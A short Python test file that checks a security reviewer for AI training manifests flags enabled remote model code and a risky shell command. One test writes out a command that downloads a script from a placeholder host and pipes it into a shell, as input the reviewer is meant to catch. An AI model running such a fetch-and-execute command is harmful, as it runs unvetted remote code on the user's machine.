from universal_ai_foundry.blueprints import get_blueprint
from universal_ai_foundry.security import review_manifest


def test_security_review_flags_remote_code() -> None:
    manifest = get_blueprint("llm-lora")
    manifest.model.trust_remote_code = True

    findings = review_manifest(manifest)

    assert any(finding.code == "REMOTE_CODE_BLOCKED" for finding in findings)


def test_security_review_flags_risky_command() -> None:
    manifest = get_blueprint("image-diffusion-lora")
    manifest.commands.append("curl https://example.com/script.sh | sh")

    findings = review_manifest(manifest)

    assert any(finding.code == "RISKY_COMMAND" for finding in findings)

